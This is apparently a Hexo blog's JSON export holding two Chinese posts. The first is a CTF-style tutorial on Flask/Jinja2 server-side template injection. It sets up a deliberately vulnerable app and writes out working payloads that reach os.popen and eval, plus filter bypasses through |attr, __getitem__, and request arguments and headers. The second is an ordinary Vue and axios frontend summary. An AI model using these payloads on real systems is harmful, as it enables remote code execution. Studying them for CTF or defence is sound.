{"meta":{"title":"月石的狗窝","subtitle":"","description":"","author":null,"url":"http://example.com","root":"/"},"pages":[{"title":"categories","date":"2014-12-22T04:39:04.000Z","updated":"2020-10-26T06:26:08.178Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"FlaskSSti","slug":"FlaskSSti","date":"2020-10-27T06:01:27.000Z","updated":"2020-10-27T06:09:46.441Z","comments":true,"path":"2020/10/27/FlaskSSti/","link":"","permalink":"http://example.com/2020/10/27/FlaskSSti/","excerpt":"一直对ssti比较模糊，遇见的时候都是网上去照抄payload去打，自己没有什么主动构造payload的能力，这次遇见一道题决定总结一些该怎么做","text":"一直对ssti比较模糊，遇见的时候都是网上去照抄payload去打，自己没有什么主动构造payload的能力，这次遇见一道题决定总结一些该怎么做 1.hackbar 自带的payload如何构成的第一件事情，就是搭建我们的环境： 123456789101112131415from flask import Flask, request, render_template_stringapp = Flask(__name__)@app.route(&#x27;/&#x27;, methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def index(): id = request.args.get(&quot;id&quot;) html = &#x27;&#x27;&#x27;&lt;h1&gt;%s&lt;/h1&gt; &#x27;&#x27;&#x27; % (id) return render_template_string(html)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=80) 这种就是最基本的flask，在flask当中jinjia的模板，我们使用两个花括号就可以允许一些基本的运算 用于执行if，for循环等等，那么我们一个最基本的payload的构造方式是该怎么触发呢？第一步，从config类触发，因为Flask里面自带 1http://localhost/?id=&#123;&#123; config.items() &#125;&#125; 通过这个类我们可以得到所有的flask的config~，而这一的意义好像不是很大？我们得不到很多东西，但是我们可以用这个作为跳板，执行下一步 1.__class__.__init__ __class方法属性的时候会只想该实例对应的类，此时config的类是Config,然后可以再去调用其它类属性，如果我们审计了源码，就可以知道我们此时的Config类位于config.py80多行，当我们执行__init__之后，便可以在下面的101行找到这么一行代码： 1rv = os.environ.get(variable_name) 也就是说，我们的config类当中含有os库的方法，如果我们直接使用是不行的，但我们可以通过globals函数先获取到它，于是得到： globals() 函数会以字典类型返回当前位置的全部全局变量,在交互模式下： 1__globals__ 于是我们拼接得到如下的payload: 1config.__class__.__init__.__globals__ 可以得到： 我们用下面这个方式来获取os库，利用__dict这个方法来查看os库哪些可以给我们进行使用 1.__globals__[&#x27;os&#x27;] 我们能够找到system，但是我们用该方法却无法得到回显，该方法只不过是成功的时候返回1，失败了则是返回0 执行如下： 12http://localhost/?id=&#123;&#123;%20config.__class__.__init__.__globals__[&#x27;os&#x27;].system(&#x27;dir()&#x27;)&#125;&#125; 得到1或者0对于我们来说意义不大，当然这样也可以进行盲注【，而popen则可以返回文件对象 os.popen 该方法不但执行命令还返回执行后的信息对象，是通过一个管道文件将结果返回。 output = os.popen(‘cat /proc/cpuinfo’) print output.read() 于是我们构造最终的payload： 1&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;dir()&#x27;).read()&#125;&#125; 1.2 config以外的思路其他的一些思路，首先，我们的config被过滤了，我们该怎么办呢？除此之外，我们还可以通过()和’’分别获取到tuple和str的初始化~ 12&#x27;&#x27;.__class__.__name__ #得到str()_.__class__.__name__ #tuple 这时引入base和mro的魔术方法 123__bases__ : 类的基类的元组，顺序为它们在基类列表中出现的顺序（基类就是Object类~）__mro__ :类的父类，从父类网上找，最终会找到基类，所以mro[-1]等价于__bases__ 这时候我们就想到的，我们既然得到了基类，是不是就想要所有的子类了呢？毕竟子类的内容我们更加感兴趣，我们最终的目标就是找到os库对吧。而python正好拥有这个魔术方法 1__subclasses__ #获取所有的子类方法 之后慢慢去寻找即可，该文章中有，在catch_warnnings模块下含有__builtins__，我们可以用这个去找eval： 12&#123;&#123; [].__class__.__mro__[-1].__subclasses__()[192].__init__.__globals__. __builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;dir()&#39;).read()&quot;) &#125;&#125; 1.3总结做题的思路：总而言之，我们要么去找builtins函数下的eval，要么去找os。 2.谈谈过滤在某些情况下，会遇见各种各样的过滤，比如我们遇见对config的过滤，以及os过滤啊等等 2.1 过滤了os，system等的情况在这种情况下我们也不需慌，如果只是对中括号中可能用到的内容进行过滤的话，我们完全可以通过拼接绕过： 比如我们之前的payload修改成： 1?id=&#123;&#123; config.__init__.__globals__[&#x27;o&#x27;+&#x27;s&#x27;].popen(&#x27;dir&#x27;).read() &#125;&#125; 2.2 过滤了中括号这样的话,可以用getitem方法，该方法等价于一个迭代器的选择，开发者的原意是让人们可以用这个迭代对象,这篇文章讲的不错 1https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_24805141&#x2F;article&#x2F;details&#x2F;81411775 Python的魔法方法__getitem__ 可以让对象实现迭代功能，这样就可以使用for...in... 来迭代该对象了，同时也允许我们利用gettiem来直接选择内容,所以我们之前的payload： 1&#123;&#123; config.__init__.__globals__.__getitem__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read() &#125;&#125; 利用request起步 1&#123;&#123; request.__class__.__mro__.__getitem__(-1).__subclasses__().__getitem__(192).__init__.__globals__.__builtins__.__getitem__(&#x27;eval&#x27;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()&quot;) &#125;&#125; 2.3 过滤了.号这个可以使用attr来进行绕过了，直接给出绕过方法： 所以之前的payload进行对比： 12345[].__class__ = []|attr(__class__)&#123;&#123;[]|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)() &#125;&#125;&#123;&#123; ([]|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)())[190] &#125;&#125; 12&#123;&#123; ([]|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)())[192]|attr(&#x27;__init__&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__builtins__&#x27;)|attr(__getitem__)(&#x27;eval&#x27;) &#125;&#125; # 拼到这里拼不下去了。。请问有人知道为什么嘛,eval无论如何都取不到了 不知道为什么在我从上往下继续取值的时候，怎么都没法继续向下取值了。但是看见可以转换思路 2.5利用request​ 因为flask此时能允许用户自定义输出，十有八九是有request的，所以我们去利用这个也不是相当不错的 这里翻阅到了一个老外思路，但是他没给全。 1http://localhost/?id=&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)|attr(&#x27;__base__&#x27;) &#125;&#125;&amp;class=class&amp;usc=_&amp;init=init 利用request的思路去重新把payload拼出来 1?id=&#123;&#123;[][request[&#x27;args&#x27;][&#x27;class&#x27;]][request[&#x27;args&#x27;][&#x27;base&#x27;]][request[&#x27;args&#x27;][&#x27;subclasses&#x27;]]()[153][request[&#x27;args&#x27;][&#x27;dict&#x27;]][request[&#x27;args&#x27;][&#x27;init&#x27;]][request[&#x27;args&#x27;][&#x27;globals&#x27;]][request[&#x27;args&#x27;][&#x27;builtins&#x27;]][&#x27;eval&#x27;](request[&#x27;args&#x27;][&#x27;payload&#x27;])&#125;&#125;&amp;base=__base__&amp;subclasses=__subclasses__&amp;dict=__dict__&amp;init=__init__&amp;globals=__globals__&amp;builtins=__builtins__&amp;class=__class__&amp;payload=__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read() 2.4将中括号和.号都过滤情况下当然上面的难度都是相当简单的题目才会遇见了，在当前环境下，往往会过滤的相当严格，我们应该从flask本身出现的类开始找，比如题目可能验证的时候，仅仅验证我们输入的id。但是我们可以利用此，让flask读取header中的内容，这样就可以打破限制 我们可以先写一个脚本： 123456789101112http://localhost/?id=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if &#x27;eval&#x27; in b.keys() %&#125; &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;dir()&quot;).read()&#x27;) &#125;&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 之后为了绕过括号的限制，采用这种方法： 这里给出一个payload： 12345678910111213141516171819&#123;% for c in []|attr(request.headers.x1)|attr(request.headers.x2)|attr(request.headers.x3)() %&#125; &#123;% if c|attr(request.headers.x4)==request.headers.x5 %&#125; &#123;%for d in ((c|attr(request.headers.x6)|attr(request.headers.x7))[request.headers.x8])%&#125; &#123;%if d==request.headers.x9%&#125;&#123;&#123;((c|attr(request.headers.x6)|attr(request.headers.x7))[request.headers.x8])[d](request.headers.x13)&#125;&#125; &#123;% endif %&#125; &#123;% endfor %&#125; &#123;% endif%&#125;&#123;% endfor %&#125; x13: __import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()x9: evalx8: __builtins__x7: __globals__x6: __init__x5: catch_warningsx4: __name__x3: __subclasses__x2: __base__x1: __class__","categories":[],"tags":[]},{"title":"Vue总结","slug":"Vue总结","date":"2020-10-25T13:28:49.000Z","updated":"2020-10-25T13:43:57.379Z","comments":true,"path":"2020/10/25/Vue总结/","link":"","permalink":"http://example.com/2020/10/25/Vue%E6%80%BB%E7%BB%93/","excerpt":"Vue part总结了前端项目的搭建，以及自己在这次作品中学到了什么","text":"Vue part总结了前端项目的搭建，以及自己在这次作品中学到了什么 Vue我认为学下来就是很爽，基本上不用再各种去绑定JS当中的dom元素了（getElementById什么的） 其中基础源码，有一个index.html 1.index.html123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0&quot;&gt; &lt;link rel=&quot;icon&quot; href=&quot;&lt;%= BASE_URL %&gt;favicon.ico&quot;&gt; &lt;title&gt;&lt;%= htmlWebpackPlugin.options.title %&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;noscript&gt; &lt;strong&gt;We&#x27;re sorry but &lt;%= htmlWebpackPlugin.options.title %&gt; doesn&#x27;t work properly without JavaScript enabled. Please enable it to continue.&lt;/strong&gt; &lt;/noscript&gt; &lt;div id=&quot;app&quot;&gt;&lt;/div&gt; &lt;!-- built files will be auto injected --&gt; &lt;/body&gt;&lt;/html&gt; 启动的时候有一个main.js，APP.vue等等。现在讲一下我是怎么做下来的，我利用到的框架是antdv，再package.json当中可以找到 2.package.json1234567891011121314151617181920212223242526272829303132&quot;dependencies&quot;: &#123; &quot;@antv/data-set&quot;: &quot;^0.11.7&quot;, &quot;@antv/g2&quot;: &quot;^4.0.15&quot;, &quot;@sven0706/websocket&quot;: &quot;^1.0.1&quot;, &quot;ant-design-vue&quot;: &quot;^1.6.5&quot;, &quot;axios&quot;: &quot;^0.20.0&quot;, &quot;core-js&quot;: &quot;^3.6.5&quot;, &quot;echarts&quot;: &quot;^4.9.0&quot;, &quot;html2canvas&quot;: &quot;^1.0.0-rc.7&quot;, &quot;js-cookie&quot;: &quot;^2.2.1&quot;, &quot;jspdf&quot;: &quot;^2.1.1&quot;, &quot;less&quot;: &quot;^3.12.2&quot;, &quot;less-loader&quot;: &quot;^7.0.1&quot;, &quot;rc-resize-observer&quot;: &quot;^0.2.5&quot;, &quot;react&quot;: &quot;^16.13.1&quot;, &quot;react-dom&quot;: &quot;^16.13.1&quot;, &quot;react-window&quot;: &quot;^1.8.5&quot;, &quot;vant&quot;: &quot;^2.10.9&quot;, &quot;vue&quot;: &quot;^2.6.11&quot;, &quot;vue-print-nb&quot;: &quot;^1.5.0&quot;, &quot;vue-router&quot;: &quot;^3.4.5&quot;, &quot;vuex&quot;: &quot;^3.5.1&quot; &#125;, &quot;devDependencies&quot;: &#123; &quot;@vue/cli-plugin-babel&quot;: &quot;~4.5.0&quot;, &quot;@vue/cli-plugin-eslint&quot;: &quot;~4.5.0&quot;, &quot;@vue/cli-service&quot;: &quot;~4.5.0&quot;, &quot;babel-eslint&quot;: &quot;^10.1.0&quot;, &quot;eslint&quot;: &quot;^6.7.2&quot;, &quot;eslint-plugin-vue&quot;: &quot;^6.2.2&quot;, &quot;vue-template-compiler&quot;: &quot;^2.6.11&quot; &#125;, 要用的时候再项目根目录下cnpm -i即可。 讲一下路由该怎么做把，首先创建一个 3.router.js1234//引入vueimport Vue from &#x27;vue&#x27;;//引入vue-routerimport VueRouter from &#x27;vue-router&#x27;; 在Vue当中，所有需要引用的东西需要用Vue.use之后才会生效 故我们构造之后的代码框架大致如下： 1234567891011121314151617//引入vueimport Vue from &#x27;vue&#x27;;//引入vue-routerimport VueRouter from &#x27;vue-router&#x27;;Vue.use(VueRouter)//引用page1页面import upload from &#x27;./components/upload.vue&#x27;;import login from &#x27;./components/login.vue&#x27;;//定义routes路由的集合，数组类型const routes=[ //单个路由均为对象类型，path代表的是路径，component代表组件 &#123;path:&#x27;/upload&#x27;,component:upload&#125;, &#123;path:&#x27;/login&#x27;,component:login&#125;, 一个Vue文件的格式如下： 4.主入口123456789101112131415161718&lt;template&gt; &lt;div id&#x3D;&quot;app&quot;&gt; &lt;router-view&#x2F;&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;export default &#123; name: &#39;App&#39;, &#125;&lt;&#x2F;script&gt;&lt;style&gt;&lt;&#x2F;style&gt; 在template当中构造HTML的代码，script当中构造当前页面的JS，而style设置中写css。如果不做限定，CSS将会是全局生效的！ 而APP作为主页面，只需要写一句话即可： 1&lt;router-view/&gt; 这一句话的意思代码将页面内容托管给Vue，根据vue的Router来显示内容 而Router的设置在main.js当中（实际上，几乎所有的设置都放在main.js当中进行统一设置） 1234new Vue(&#123; router, render: h =&gt; h(App),&#125;).$mount(&#x27;#app&#x27;) 在main.js导入的模块可以全项目生效，如果想要普通的生效一个模块，这样构造： 123456789101112import &#123; Button, Table, Menu, Switch,Icon,Layout,Upload,Breadcrumb,FormModel,Input,Divider,message,Form,Alert,Spin,Modal &#125; from &#x27;ant-design-vue&#x27;//在下面：Vue.use(Modal)Vue.use(Spin)Vue.use(Alert)Vue.use(Form)Vue.use(axios)Vue.use(htmlToPdf)Vue.use(Divider)Vue.use(Input)Vue.use(FormModel) 如果想要修改Vue默认的设置，例如我们导入axios的时候这样构造： 12import axios from &#x27;axios&#x27;Vue.prototype.$http = axios 之后我构造了一个公共使用的Vue模板，也就是菜单栏的插件，我是创建了一个commons文件夹，并写在里面 5.插槽12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;template&gt; &lt;a-layout id=&quot;components-layout-demo-side&quot; style=&quot;min-height: 100vh&quot;&gt; &lt;a-layout-sider v-model=&quot;collapsed&quot; width=&quot;12%&quot; collapsible&gt; &lt;div class=&quot;logo&quot; /&gt; &lt;a-menu theme=&quot;dark&quot; :default-selected-keys=&quot;[&#x27;1&#x27;]&quot; mode=&quot;inline&quot;&gt; &lt;a-menu-item key=&quot;1&quot;&gt; &lt;router-link to=&quot;upload&quot;&gt;&lt;a-icon type=&quot;cloud-download&quot; /&gt; &lt;span&gt; 文件上传 &lt;/span&gt; &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;a-sub-menu key=&quot;sub1&quot;&gt; &lt;span slot=&quot;title&quot;&gt;&lt;a-icon type=&quot;area-chart&quot; /&gt; &lt;span&gt; 数据分析 &lt;/span&gt; &lt;/span&gt; &lt;a-menu-item key=&quot;2&quot;&gt; &lt;router-link to=&quot;report&quot;&gt; 日志分析 &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;a-menu-item key=&quot;3&quot;&gt; &lt;router-link to=&quot;getpdf&quot;&gt; 获取报告 &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;/a-sub-menu&gt; &lt;a-sub-menu key=&quot;sub2&quot;&gt; &lt;span slot=&quot;title&quot;&gt;&lt;a-icon type=&quot;dashboard&quot; /&gt;&lt;span&gt;立体数据&lt;/span&gt;&lt;/span&gt; &lt;a-menu-item key=&quot;5&quot;&gt; &lt;router-link to=&quot;attackaddress&quot;&gt; 攻击溯源 &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;a-menu-item key=&quot;8&quot;&gt; &lt;router-link to=&quot;watchlog&quot;&gt; 实时监控 &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;/a-sub-menu&gt; &lt;a-menu-item key=&quot;9&quot;&gt; &lt;router-link to=&quot;setting&quot;&gt; &lt;a-icon type=&quot;setting&quot; /&gt; &lt;span&gt;系统设置&lt;/span&gt; &lt;/router-link&gt; &lt;/a-menu-item&gt; &lt;a-menu-item key=&quot;10&quot; @click=&quot;showModal&quot;&gt; &lt;a-icon type=&quot;login&quot; /&gt; &lt;span &gt;登出&lt;/span&gt; &lt;a-modal v-model=&quot;visible&quot; title=&quot;Basic Modal&quot; @ok=&quot;handleOk&quot;&gt; &lt;p&gt;是否确定登出？&lt;/p&gt; &lt;/a-modal&gt; &lt;/a-menu-item&gt; &lt;/a-menu&gt; &lt;/a-layout-sider&gt; &lt;a-layout&gt; &lt;a-layout-header theme=dark &gt; &lt;/a-layout-header&gt; &lt;!-- 上面是在导航栏最顶端加东西 --&gt; &lt;a-layout-content style=&quot;margin: 0 16px&quot;&gt; &lt;slot&gt;&lt;/slot&gt; &lt;/a-layout-content&gt; &lt;a-layout-footer style=&quot;text-align: center&quot;&gt; Ant Design ©2018 Created by Ant UED &lt;/a-layout-footer&gt; &lt;/a-layout&gt; &lt;/a-layout&gt;&lt;/template&gt;&lt;script&gt; 需要注意的是： 1&lt;slot&gt;&lt;/slot&gt; 在Vue当中，这个相当于一个插槽，也就是，呃，类似一个include函数，我们如果想要把他当作模板的话就需要这样写，比如我们的report.vue 1234567import menus from &#x27;../commons/menu&#x27;&lt;menu&gt;&lt;/menu&gt;//在下面导入，之后再html当中使用即可components:&#123; menus, &#125;, 6.路由守卫我们前端肯定是要鉴权的吧，不然用户就可对前端为所欲为了，故我们构造一个局部守卫是这样的： 123456beforeRouteEnter(to,from,next) &#123; axios.post(&#x27;/report&#x27;).then(res =&gt;&#123; if (res.data == 0) next(&#123; path:&#x27;/&#x27; &#125;); else next(); &#125;) &#125;, 这样的话，再访问该路由，离开路由的时候都会先访问一次页面，我们后端写好代码，如果用户没有登陆的话，就会返回到index页面了。 7.期待值这个理解起来单靠嘴说较为僵硬，需要实战中使用才可以领悟的清楚，比如我们的html代码中构造如下： 1&lt;a-button type=&quot;danger&quot; :style=&quot;&#123;margin:&#x27;-20px 0px 0px 200px&#x27;&#125;&quot; @click=&quot;ExportSavePdf(htmlTitle,nowTime)&quot;&gt;报告生成&lt;/a-button&gt; （通过Vue框架，我们可以使用@click的方法来处理各种事件，之后填入一个函数，并写入函数的实参，而实参不一定是一定出现的，所以我们的实参可能会出现为null的情况，而Vue不想出现这种情况，所以要求我们填入默认值，也就是期待值，当我们没有填入参数的时候自动填入的参数 12345678data() &#123; return &#123; data, columns, htmlTitle: &#x27;report&#x27;, keyName: &#x27;&#x27;, &#125;; &#125;, 8.设置默认值有的时候，我们可能想在用户访问之前的时候直接获取数据，这样的话就可以直接拿到数据了，于是我们可以通过如下方法： 123mounted() &#123; // this.drawChart(); &#125; 以这种方式填入的值，当用户访问页面的时候便会自动进行调用。例子： 1234567axios.post(&#x27;/setting&#x27;).then(res=&gt;&#123; this.usersData(res.data); // location.reload() &#125;).catch(err=&gt;&#123; // console.log(err) &#125;) &#125; 9.实现监听数据在之前的layui的时候，因为我不会对数据进行绑定，所以往往造成自己要写很多的type=hiden，或者必须构造form表单的情况，而使用框架之后可以通过v-model操作简单的实现这个效果， 例如我们可以构造如下代码： 123456789101112131415161718192021222324252627282930313233343536&lt;a-form-model-item style=&quot;margin: 0px 10px 0px 00px&quot; class=&quot;selectAddress&quot;&gt; &lt;a-input type=&quot;password&quot; placeholder=&quot;logKey&quot; v-model=&quot;attackAddressName&quot;&gt; &lt;a-icon slot=&quot;prefix&quot; type=&quot;lock&quot; style=&quot;color:rgba(0,0,0,.25)&quot; /&gt; &lt;/a-input&gt; &lt;/a-form-model-item&gt; &lt;a-form-model-item class=&quot;selectButton&quot;&gt; &lt;a-button type=&quot;primary&quot; html-type=&quot;submit&quot; @click=&quot;selectAddress($event)&quot; &gt; 添加 &lt;/a-button&gt; &lt;/a-form-model-item&gt;//在JS代码中：selectAddress:function(event)&#123; // console.log(this.attackAddressName) let formAddress = new FormData(); formAddress.append(&#x27;logname&#x27;, this.attackAddressName) // console.log(formAddress.get(&#x27;logname&#x27;)) this.spinning = true; axios.post(&#x27;/setting&#x27;,formAddress).then(res =&gt;&#123; let earchData =JSON.parse(res.data) // console.log(res.data) this.china(earchData); this.spinning = false; &#125;).catch(err =&gt;&#123; console.log(err); &#125;) &#125; 我们可以发现，我并没有写form表单，而我依然可以实现提交数据，是因为使用v-model监听之后，该input输入框的内容被JS实时监控着。 10.监听的妙用利用监听，我们可以很轻松的完成对一些看起来很酷炫的特效，比如，如果用户想要提交点击一个按钮，就需要填写几个input框，并且如果框是空的，还可以给出提示等等，这里举出一个例子，比如： 123456789101112&lt;!-- 用户名判断 --&gt; &lt;a-form-item :validate-status=&quot;userNameError() ? &#x27;error&#x27; : &#x27;&#x27;&quot; :help=&quot;userNameError() || &#x27;&#x27;&quot;&gt; &lt;a-input v-decorator=&quot;[ &#x27;userName&#x27;, &#123; rules: [&#123; required: true, message: &#x27;Please input your username!&#x27; &#125;] &#125;, ]&quot; placeholder=&quot;Username&quot; &gt; &lt;a-icon slot=&quot;prefix&quot; type=&quot;user&quot; style=&quot;color:rgba(0,0,0,.25)&quot; /&gt; &lt;/a-input&gt; &lt;/a-form-item&gt; 顺便一提， 用:引号写入的东西，一般我们是用于条件判断，比如在这里，我们就是利用这个去判断userNameError的状况 在methods当中，我们构造如下代码： 1234userNameError() &#123; const &#123; getFieldError, isFieldTouched &#125; = this.form; return isFieldTouched(&#x27;userName&#x27;) &amp;&amp; getFieldError(&#x27;userName&#x27;); &#125;, 在data当中： 123456data() &#123; return &#123; hasErrors, form: this.$form.createForm(this, &#123; name: &#x27;getWebsocket&#x27; &#125;), &#125;; &#125;, 官方是如下解释的： v-decorator 是 Ant Design 的控件验证属性。 经过 getFieldDecorator 或 v-decorator 包装的控件，表单控件会自动添加 value（或 valuePropName 指定的其他属性） onChange（或 trigger 指定的其他属性），数据同步将被 Form 接管，这会导致以下结果： 你不再需要也不应该用 onChange 来做同步，但还是可以继续监听 onChange 等事件。 你不能用控件的 value defaultValue 等属性来设置表单域的值，默认值可以用 getFieldDecorator 或 v-decorator 里的 initialValue。 你不应该用 v-model，可以使用 this.form.setFieldsValue 来动态改变表单值。 也就是说这种方式是吧form由Vue彻底托管了~和之前的不同，会自动判断是否存在值，如果不存在的话，将会调用v-decorator。当然这种方式我是比较模糊的，真要说我比较理解的是另外一个形式 11.v-model的妙用在html当中写下： 12345678910111213141516171819&lt;a-form-model-item style=&quot;margin: 0px 10px 0px 00px&quot; class=&quot;selectAddress&quot;&gt; &lt;a-input type=&quot;password&quot; placeholder=&quot;logKey&quot; v-model=&quot;attackAddressName&quot;&gt; &lt;a-icon slot=&quot;prefix&quot; type=&quot;lock&quot; style=&quot;color:rgba(0,0,0,.25)&quot; /&gt; &lt;/a-input&gt; &lt;/a-form-model-item&gt; &lt;a-form-model-item class=&quot;selectButton&quot;&gt; &lt;a-button type=&quot;primary&quot; html-type=&quot;submit&quot; @click=&quot;selectAddress($event)&quot; &gt; 添加 &lt;/a-button&gt; &lt;/a-form-model-item&gt;&lt;a-alert message=&quot;输入key，即可自动溯源&quot; type=&quot;info&quot; class=&quot;fontKey&quot; /&gt; &lt;a-spin size=&quot;large&quot; class=&quot;spinner&quot; :spinning=&quot;spinning&quot; :delay=&quot;delayTime&quot; /&gt; 注意这里的spinning，我们给她进行托管，如果可以的话，而spinning的期望默认值在data当中构造： 1234567data()&#123; return&#123; attackAddressName:&#x27;&#x27;, spinning: false, delayTime: 500, &#125; &#125;, 而当我们点击按钮发送数据之后： 123456789101112131415161718selectAddress:function(event)&#123; // console.log(this.attackAddressName) let formAddress = new FormData(); formAddress.append(&#x27;logname&#x27;, this.attackAddressName) // console.log(formAddress.get(&#x27;logname&#x27;)) this.spinning = true; axios.post(&#x27;/setting&#x27;,formAddress).then(res =&gt;&#123; let earchData =JSON.parse(res.data) // console.log(res.data) this.china(earchData); this.spinning = false; &#125;).catch(err =&gt;&#123; console.log(err); &#125;) &#125; 一旦数据成功发送过去，我们就将spinning的值改成true，这样就可以显示了，当获取数据之后，我们就改成false，让他消失即可 axios part1.aiox发送数据axios是一个组件，用于发送数据给后端，相当好用，我们为了降低代码耦合性，应该抓门建立一个axios文件夹，并且设置一个http.js，各种各样的设置我们都在axios当中进行配置即可： 12345import axios from &#x27;axios&#x27;axios.defaults.baseURL = &#x27;http://localhost:8081&#x27;;axios.defaults.timeout = 1000000;axios.defaults.withCredentials = true 例如这样，就是设置了默认的url，设置超时事件，带上cookies等等，而axios的使用也很简单，构造如下： 12345678910111213axios.post(&quot;/login&quot;,formData,config).then(res =&gt; &#123; if(res.data == 0 )&#123; alert(&quot;账号或密码错误！&quot;) &#125; else&#123; this.$message.success(` login successfully!`); router.push(&#123; path:&quot;/upload&quot; &#125;) &#125; &#125;).catch(err =&gt; &#123; console.log(err) &#125;); axios.get/post axios.get().theml().catch() 在then和cat当中去写别的东西，上图当中的res.data为API给回来的数据，成功之后router.push就可以让页面进行跳转了 总结感觉自己是边学边写的，学到后面的时候感觉之前的东西还可以做得更好，但是蓝狗了，已经不想动了orz","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"}]}],"categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"}]}